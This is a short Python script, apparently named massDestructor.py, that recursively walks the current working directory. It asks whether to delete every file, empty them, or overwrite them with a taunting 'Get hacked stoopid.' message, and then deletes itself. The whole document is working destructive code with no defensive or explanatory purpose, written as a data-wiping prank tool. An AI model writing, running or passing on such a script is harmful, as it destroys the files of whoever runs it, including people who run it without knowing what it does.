import os
def getAllFiles(dir):
    filePaths = []
    for root,_,files in os.walk(dir):
        for file in files:
            filePath = os.path.join(root,file)
            if os.path.isdir(filePath):
                filePath=getAllFiles(filePath)
            filePaths.append(filePath)
    return filePaths
def massDestruction(levelOfDestruction):
    fileNames = getAllFiles(os.getcwd())
    for fileName in fileNames:
        if "massDestructor.py" not in fileName:
            with open(fileName, "w") as toBeDeleted:
                if levelOfDestruction=="D":
                    os.remove(fileName)
                else:
                    toBeDeleted.truncate()
                    if levelOfDestruction=="P":
                        toBeDeleted.write("Get hacked stoopid.")
    os.remove(os.path.basename(__file__))
massDestruction(input("Would you like to (P)sychologically destroy youself, (E)mpty al files, or (D)elete all files?"))